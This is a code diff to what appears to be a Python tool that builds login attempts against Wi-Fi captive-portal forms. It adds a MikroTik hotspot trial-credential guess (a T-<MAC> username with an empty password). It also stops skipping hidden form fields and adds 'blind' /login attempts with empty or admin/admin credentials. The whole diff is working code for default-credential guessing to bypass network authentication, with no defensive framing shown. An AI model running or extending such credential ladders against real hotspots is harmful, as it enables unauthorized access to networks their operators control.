@@ -132,6 +132,7 @@ for f in forms:
         'adminp': ('admin', ''),
         'trial':  ('T-%s' % mac_d, mac_l),
         'triald': ('T-%s' % mac_d, mac_d),
+        'trialnp': ('T-%s' % mac_d, ''),
     }
 
     def payload(mode):
@@ -139,8 +140,6 @@ for f in forms:
         if mode in CREDS:
             user, pw = CREDS[mode]
             for x in f['fields']:
-                if x['type'] == 'hidden':
-                    continue
                 n = x['name'].lower()
                 if n in ('username', 'user', 'login'):
                     out.append((x['name'], user))
@@ -186,7 +185,19 @@ for f in forms:
             ladder += [
                 ('trial',  'MikroTik trial login T-<MAC> / <MAC> (%s)' % MAC, UA_BROWSER),
                 ('triald', 'MikroTik trial login T-<MAC> / dashed MAC', UA_BROWSER),
+                ('trialnp', 'MikroTik trial login T-<MAC> / empty password', UA_BROWSER),
             ]
+
+    if '/login' in action and not (names & {'username', 'user', 'login'}):
+        for mode, label, ua in (('blank', 'blind /login: empty user+pass', UA_BROWSER),
+                                ('admin', 'blind /login: admin/admin', UA_BROWSER)):
+            pairs = list(base_fields) + [('username', CREDS[mode][0]), ('password', CREDS[mode][1])]
+            key = (method, action, tuple(pairs), ua)
+            if key in seen:
+                continue
+            seen.add(key)
+            idx += 1
+            rows.append((idx, method, action, '&'.join('%s=%s' % kv for kv in pairs), label, ua))
 
     for mode, label, ua in ladder:
         pairs = payload(mode)
